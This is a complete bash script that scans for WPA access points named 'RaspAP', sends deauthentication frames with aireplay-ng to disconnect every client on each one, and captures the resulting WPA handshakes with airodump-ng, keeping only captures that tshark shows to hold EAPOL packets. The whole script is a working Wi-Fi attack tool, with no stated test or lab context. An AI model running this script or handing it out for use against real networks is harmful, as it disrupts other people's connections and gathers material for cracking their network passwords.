#!/bin/bash

IFACE="wlan1mon"
CAPDIR="./handshakes"
mkdir -p "$CAPDIR"

echo "[*] Scanning for WPA APs with clients..."
timeout 15s sudo airodump-ng --write "$CAPDIR/scan" --output-format csv --essid-regex RaspAP "$IFACE"

killall airodump-ng

cat "$CAPDIR/scan-01.csv" | grep WPA | grep -v ",," | while IFS=, read -r bssid first_seen last_seen channel privacy cipher auth power beacons iv lan_ip idleness essid key
do
    bssid=$(echo $bssid | xargs)
    channel=$(echo $channel | xargs)
    essid=$(echo $essid | xargs | tr -d '\r')
    
    if [ -z "$bssid" ] || [ -z "$channel" ]; then
        continue
    fi

    echo "[*] Targeting $essid ($bssid) on channel $channel"

    # Start capture
    timeout 60s sudo airodump-ng --bssid "$bssid" --channel "$channel" --write "$CAPDIR/$essid" "$IFACE" &
    DUMP_PID=$!

    # Give it time to start
    sleep 5

    # Deauth all clients
    aireplay-ng --deauth 5 -a "$bssid" "$IFACE"

    # Wait for capture to finish
    wait $DUMP_PID

    # Check for handshake
    if tshark -r "$CAPDIR/$essid-01.cap" -Y "eapol" | grep -q "EAPOL"; then
        echo "[+] Handshake captured for $essid!"
    else
        echo "[-] No handshake found for $essid"
        rm "$CAPDIR/$essid-01.cap"
    fi
done
